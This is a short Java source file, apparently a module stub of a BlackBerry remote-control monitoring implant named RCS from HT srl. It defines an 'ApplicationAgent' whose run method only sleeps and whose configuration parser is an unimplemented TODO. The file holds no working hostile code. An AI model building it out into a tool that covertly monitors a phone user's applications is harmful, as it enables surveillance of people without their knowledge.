/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : ApplicationAgent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class ApplicationAgent extends Agent {
    private static Debug debug = new Debug("ApplicationAgent",
            DebugLevel.VERBOSE);

    public ApplicationAgent(int AgentStatus) {
        super(Agent.AGENT_APPLICATION, AgentStatus, true);
    }

    protected ApplicationAgent(int AgentStatus, byte[] confParams) {
        this(AgentStatus);
        Parse(confParams);
    }

    public void AgentRun() {

        this.SleepUntilStopped();

    }

    protected boolean Parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
